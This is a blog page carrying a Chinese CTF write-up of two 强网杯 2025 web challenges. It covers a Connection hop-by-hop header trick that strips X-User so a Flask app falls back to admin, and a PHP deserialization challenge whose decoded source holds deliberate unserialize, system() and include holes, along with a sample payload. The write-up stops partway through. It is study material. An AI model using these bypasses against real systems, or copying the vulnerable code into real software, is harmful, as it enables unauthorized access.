@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这次我就做了两个web。跟V&amp;N的兄弟们拿了个25名，勉强晋级决赛。这是V&amp;N第一次打进强网正赛。我们创造了历史。 因为我时间比较紧张，就只写我做的两题了。 Web 2.Secret Vault 一个python的web app。flask。有个go的鉴权服务器。这个服务器有个后端，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯 2025 部分web wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2025-10-21-2025-web-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="这次我就做了两个web。跟V&amp;N的兄弟们拿了个25名，勉强晋级决赛。这是V&amp;N第一次打进强网正赛。我们创造了历史。 因为我时间比较紧张，就只写我做的两题了。 Web 2.Secret Vault 一个python的web app。flask。有个go的鉴权服务器。这个服务器有个后端，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19156437/01.png">
+<meta property="article:published_time" content="2025-10-21T13:20:00.000Z">
+<meta property="article:modified_time" content="2025-10-21T13:20:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/19156437/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>强网杯 2025 部分web wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2025-12-06-2025-2026/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2025-09-20-typhon-pyjail/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-10-21-2025-web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&text=强网杯 2025 部分web wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&is_video=false&description=强网杯 2025 部分web wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯 2025 部分web wp&body=Check out this article: https://lamentxu.top/posts/2025-10-21-2025-web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&name=强网杯 2025 部分web wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&t=强网杯 2025 部分web wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Secret-Vault"><span class="toc-number">1.1.</span> <span class="toc-text">2.Secret Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-EZ-PHP"><span class="toc-number">1.2.</span> <span class="toc-text">3.EZ PHP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">2.</span> <span class="toc-text">后记</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        强网杯 2025 部分web wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-21T13:20:00.000Z" class="dt-published" itemprop="datePublished">2025-10-21</time>
+        
+        (Updated: <time datetime="2025-10-21T13:20:00.000Z" class="dt-updated" itemprop="dateModified">2025-10-21</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/images/migrated/19156437/01.png" alt="image"></p>
+<p>这次我就做了两个web。跟V&amp;N的兄弟们拿了个25名，勉强晋级决赛。这是V&amp;N第一次打进强网正赛。我们创造了历史。</p>
+<p>因为我时间比较紧张，就只写我做的两题了。</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="2-Secret-Vault"><a href="#2-Secret-Vault" class="headerlink" title="2.Secret Vault"></a>2.Secret Vault</h2><p>一个python的web app。flask。有个go的鉴权服务器。这个服务器有个后端，来自github.com&#x2F;gorilla&#x2F;mux，有一段签名逻辑，开在4444端口</p>
+<p>go的鉴权服务器有个中间件。开在5555，会从主服务器（5000）中获取JWT密钥，验证并提取uid，然后删掉一些头：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">req.Header.Del(&quot;Authorization&quot;)</span><br><span class="line">req.Header.Del(&quot;X-User&quot;)</span><br><span class="line">req.Header.Del(&quot;X-Forwarded-For&quot;)</span><br><span class="line">req.Header.Del(&quot;Cookie&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>然后将X-User设置为uid。</p>
+<p>客户机向主服务器（5000）交一段JWT的auth信息，通过过中间件处理后，会返回uid。如果中间件验证失败就是anonymous，也就是鉴权失败。</p>
+<p>他这个主服务器上的鉴权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def login_required(view_func):</span><br><span class="line">    @wraps(view_func)</span><br><span class="line">    def wrapped(*args, **kwargs):</span><br><span class="line">        uid = request.headers.get(&#x27;X-User&#x27;, &#x27;0&#x27;)</span><br><span class="line">        print(uid)</span><br><span class="line">        if uid == &#x27;anonymous&#x27;:</span><br><span class="line">            flash(&#x27;Please sign in first.&#x27;, &#x27;warning&#x27;)</span><br><span class="line">            return redirect(url_for(&#x27;login&#x27;))</span><br><span class="line">        try:</span><br><span class="line">            uid_int = int(uid)</span><br><span class="line">        except (TypeError, ValueError):</span><br><span class="line">            flash(&#x27;Invalid session. Please sign in again.&#x27;, &#x27;warning&#x27;)</span><br><span class="line">            return redirect(url_for(&#x27;login&#x27;))</span><br><span class="line">        user = User.query.filter_by(id=uid_int).first()</span><br><span class="line">        if not user:</span><br><span class="line">            flash(&#x27;User not found. Please sign in again.&#x27;, &#x27;warning&#x27;)</span><br><span class="line">            return redirect(url_for(&#x27;login&#x27;))</span><br><span class="line"></span><br><span class="line">        g.current_user = user</span><br><span class="line">        return view_func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    return wrapped</span><br></pre></td></tr></table></figure>
+
+<p>如果获取失败uid就是0，uid是0的用户正好是admin。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user = User(</span><br><span class="line">    id=0,</span><br><span class="line">    username=&#x27;admin&#x27;,</span><br><span class="line">    password_hash=password_hash,</span><br><span class="line">    salt=base64.b64encode(salt).decode(&#x27;utf-8&#x27;),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>所以我们现在就是要想个办法让中间件的返回头里没有 <code>X-User</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">    authorizer := &amp;httputil.ReverseProxy&#123;Director: func(req *http.Request) &#123;</span><br><span class="line">        req.URL.Scheme = &quot;http&quot;</span><br><span class="line">        req.URL.Host = &quot;127.0.0.1:5000&quot;</span><br><span class="line"></span><br><span class="line">        uid := GetUIDFromRequest(req)</span><br><span class="line">        log.Printf(&quot;Request UID: %s, URL: %s&quot;, uid, req.URL.String())</span><br><span class="line">        req.Header.Del(&quot;Authorization&quot;)</span><br><span class="line">        req.Header.Del(&quot;X-User&quot;)</span><br><span class="line">        req.Header.Del(&quot;X-Forwarded-For&quot;)</span><br><span class="line">        req.Header.Del(&quot;Cookie&quot;)</span><br><span class="line"></span><br><span class="line">        if uid == &quot;&quot; &#123;</span><br><span class="line">            req.Header.Set(&quot;X-User&quot;, &quot;anonymous&quot;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            req.Header.Set(&quot;X-User&quot;, uid)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection: close,X-User</span><br></pre></td></tr></table></figure>
+
+<p>此时不管中间件传回怎样的X-User值，在客户机与中间件的Connection被Connection Header给close掉之后，也根据RFC HTTP1&#x2F;1的规范（为了向下兼容）将X-User置空。因此我们得到了空的X-User。</p>
+<p>在<code>uid = request.headers.get(&#39;X-User&#39;, &#39;0&#39;)</code>中，我们得到了uid为0的用户的登录权限。</p>
+<p>之后我们直接就能看到明文flag。</p>
+<p>最后的包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard HTTP/1.1</span><br><span class="line">Host: 39.106.47.249:33002</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://39.106.47.249:33002/login</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlZ2lzdHJhdGlvbiBzdWNjZXNzZnVsLiBQbGVhc2Ugc2lnbiBpbi4iXX1dfQ.aPL-ZA.tZC2005ISCmkE8hJbh-zz9iu_qE; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJBdXRob3JpemVyIiwic3ViIjoiMSIsImV4cCI6MTc2MDc1ODkwNCwibmJmIjoxNzYwNzU1MzA0LCJpYXQiOjE3NjA3NTUzMDQsInVpZCI6IjEifQ.gg-1I8lk7m-mvmWo0X7pSXY9auJQ31sn1G-gcUzRGro</span><br><span class="line">Connection: close,X-User</span><br></pre></td></tr></table></figure>
+
+<p>flag{698d8138-f41d-4f03-9301-3b37f0b2dd7b}</p>
+<h2 id="3-EZ-PHP"><a href="#3-EZ-PHP" class="headerlink" title="3.EZ PHP"></a>3.EZ PHP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval(base64_decode(&#x27;ZnVuY3Rpb24gZ2VuZXJhdGVSYW5kb21TdHJpbmcoJGxlbmd0aCA9IDgpeyRjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JzskcmFuZG9tU3RyaW5nID0gJyc7Zm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgeyRyID0gcmFuZCgwLCBzdHJsZW4oJGNoYXJhY3RlcnMpIC0gMSk7JHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1skcl07fXJldHVybiAkcmFuZG9tU3RyaW5nO31kYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL1NoYW5naGFpJyk7Y2xhc3MgdGVzdHtwdWJsaWMgJHJlYWRmbGFnO3B1YmxpYyAkZjtwdWJsaWMgJGtleTtwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXskdGhpcy0+cmVhZGZsYWcgPSBuZXcgY2xhc3Mge3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpe2lmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pICYmICRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA9PSAwKSB7JHRpbWUgPSBkYXRlKCdIaScpOyRmaWxlbmFtZSA9ICRHTE9CQUxTWydmaWxlbmFtZSddOyRzZWVkID0gJHRpbWUgLiBpbnR2YWwoJGZpbGVuYW1lKTttdF9zcmFuZCgkc2VlZCk7JHVwbG9hZERpciA9ICd1cGxvYWRzLyc7JGZpbGVzID0gZ2xvYigkdXBsb2FkRGlyIC4gJyonKTtmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHtpZiAoaXNfZmlsZSgkZmlsZSkpIHVubGluaygkZmlsZSk7fSRyYW5kb21TdHIgPSBnZW5lcmF0ZVJhbmRvbVN0cmluZyg4KTskbmV3RmlsZW5hbWUgPSAkdGltZSAuICcuJyAuICRyYW5kb21TdHIgLiAnLicgLiAnanBnJzskR0xPQkFMU1snZmlsZSddID0gJG5ld0ZpbGVuYW1lOyR1cGxvYWRlZEZpbGUgPSAkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ107JHVwbG9hZFBhdGggPSAkdXBsb2FkRGlyIC4gJG5ld0ZpbGVuYW1lOyBpZiAoc3lzdGVtKCJjcCAiLiR1cGxvYWRlZEZpbGUuIiAiLiAkdXBsb2FkUGF0aCkpIHtlY2hvICJzdWNjZXNzIHVwbG9hZCEiO30gZWxzZSB7ZWNobyAiZXJyb3IiO319fXB1YmxpYyBmdW5jdGlvbiBfX3dha2V1cCgpe3BocGluZm8oKTt9cHVibGljIGZ1bmN0aW9uIHJlYWRmbGFnKCl7ZnVuY3Rpb24gcmVhZGZsYWcoKXtpZiAoaXNzZXQoJEdMT0JBTFNbJ2ZpbGUnXSkpIHskZmlsZSA9ICRHTE9CQUxTWydmaWxlJ107JGZpbGUgPSBiYXNlbmFtZSgkZmlsZSk7aWYgKHByZWdfbWF0Y2goJy86XC9cLy8nLCAkZmlsZSkpZGllKCJlcnJvciIpOyRmaWxlX2NvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygidXBsb2Fkcy8iIC4gJGZpbGUpO2lmIChwcmVnX21hdGNoKCcvPFw/fFw6XC9cL3xwaHxcP1w9L2knLCAkZmlsZV9jb250ZW50KSkge2RpZSgiSWxsZWdhbCBjb250ZW50IGRldGVjdGVkIGluIHRoZSBmaWxlLiIpO31pbmNsdWRlKCJ1cGxvYWRzLyIgLiAkZmlsZSk7fX19fTt9cHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXskZnVuYyA9ICR0aGlzLT5mOyRHTE9CQUxTWydmaWxlbmFtZSddID0gJHRoaXMtPnJlYWRmbGFnO2lmICgkdGhpcy0+a2V5ID09ICdjbGFzcycpbmV3ICRmdW5jKCk7ZWxzZSBpZiAoJHRoaXMtPmtleSA9PSAnZnVuYycpIHskZnVuYygpO30gZWxzZSB7aGlnaGxpZ2h0X2ZpbGUoJ2luZGV4LnBocCcpO319fSRzZXIgPSBpc3NldCgkX0dFVFsnbGFuZCddKSA/ICRfR0VUWydsYW5kJ10gOiAnTzo0OiJ0ZXN0IjpOJztAdW5zZXJpYWxpemUoJHNlcik7&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>base64解码后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">function generateRandomString($length = 8) &#123;</span><br><span class="line">    $characters = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;;</span><br><span class="line">    $randomString = &#x27;&#x27;;</span><br><span class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $r = rand(0, strlen($characters) - 1);</span><br><span class="line">        $randomString .= $characters[$r];</span><br><span class="line">    &#125;</span><br><span class="line">    return $randomString;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class="line"></span><br><span class="line">class test &#123;</span><br><span class="line">    public $readflag;</span><br><span class="line">    public $f;</span><br><span class="line">    public $key;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;readflag = new class &#123;</span><br><span class="line">            public function __construct() &#123;</span><br><span class="line">                if (isset($_FILES[&#x27;file&#x27;]) &amp;&amp; $_FILES[&#x27;file&#x27;][&#x27;error&#x27;] == 0) &#123;</span><br><span class="line">                    $time = date(&#x27;Hi&#x27;);</span><br><span class="line">                    $filename = $GLOBALS[&#x27;filename&#x27;];</span><br><span class="line">                    $seed = $time . intval($filename);</span><br><span class="line">                    mt_srand($seed);</span><br><span class="line">                    $uploadDir = &#x27;uploads/&#x27;;</span><br><span class="line">                    $files = glob($uploadDir . &#x27;*&#x27;);</span><br><span class="line">                    foreach ($files as $file) &#123;</span><br><span class="line">                        if (is_file($file)) &#123;</span><br><span class="line">                            unlink($file);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $randomStr = generateRandomString(8);</span><br><span class="line">                    $newFilename = $time . &#x27;.&#x27; . $randomStr . &#x27;.&#x27; . &#x27;jpg&#x27;;</span><br><span class="line">                    $GLOBALS[&#x27;file&#x27;] = $newFilename;</span><br><span class="line">                    $uploadedFile = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">                    $uploadPath = $uploadDir . $newFilename;</span><br><span class="line">                    if (system(&quot;cp &quot; . $uploadedFile . &quot; &quot; . $uploadPath)) &#123;</span><br><span class="line">                        echo &quot;success upload!&quot;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        echo &quot;error&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public function __wakeup() &#123;</span><br><span class="line">                phpinfo();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public function readflag() &#123;</span><br><span class="line">                function readflag() &#123;</span><br><span class="line">                    if (isset($GLOBALS[&#x27;file&#x27;])) &#123;</span><br><span class="line">                        $file = $GLOBALS[&#x27;file&#x27;];</span><br><span class="line">                        $file = basename($file);</span><br><span class="line">                        if (preg_match(&#x27;/:\/\//&#x27;, $file)) &#123;</span><br><span class="line">                            die(&quot;error&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                        $file_content = file_get_contents(&quot;uploads/&quot; . $file);</span><br><span class="line">                        if (preg_match(&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;, $file_content)) &#123;</span><br><span class="line">                            die(&quot;Illegal content detected in the file.&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                        include(&quot;uploads/&quot; . $file);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $func = $this-&gt;f;</span><br><span class="line">        $GLOBALS[&#x27;filename&#x27;] = $this-&gt;readflag;</span><br><span class="line">        if ($this-&gt;key == &#x27;class&#x27;) &#123;</span><br><span class="line">            new $func();</span><br><span class="line">        &#125; else if ($this-&gt;key == &#x27;func&#x27;) &#123;</span><br><span class="line">            $func();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ser = isset($_GET[&#x27;land&#x27;]) ? $_GET[&#x27;land&#x27;] : &#x27;O:4:&quot;test&quot;:N&#x27;;</span><br><span class="line">@unserialize($ser);</span><br></pre></td></tr></table></figure>
+
+<p>我们正常走destruct看phpinfo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:1:&quot;f&quot;;s:7:&quot;phpinfo&quot;;s:3:&quot;key&quot;;s:4:&quot;func&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里禁止了很多。但是因为源码里有<code>system</code>所以我们可以直接用<code>system</code>去RCE。这个WAF就绕过去了。</p>
+<p>观察源代码 我们思路就是：</p>
+<ul>
+<li><p>传个文件（传什么文件过会再说）</p>
+</li>
+<li><p>调用到匿名类的readflag 使readflag被声明</p>
+</li>
+<li><p>直接调用readflag</p>
+</li>
+</ul>
+<p>好。现在的问题是怎么调这个匿名类的readflag。</p>
+<p>匿名类遵循这样的规则：</p>
+<p><code>%00 + 函数 + 路径 : 行号$序号</code></p>
+<p>但是这里是eval里注册的，我们起一个示例看看。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(&#x27;$b = new class&#123;&#125;;&#x27;);</span><br><span class="line">echo get_class($b);</span><br></pre></td></tr></table></figure>
+
+<p>随便注册一个eval里的动态函数你就能发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class@anonymous/tmp/sandbox.s0-s0;c428,c730/home/.code.tio(2) : eval()&#x27;d code0x7f26184710c7</span><br></pre></td></tr></table></figure>
+
+<p>这个行号是eval()’d code+数字。别的是一样的。</p>
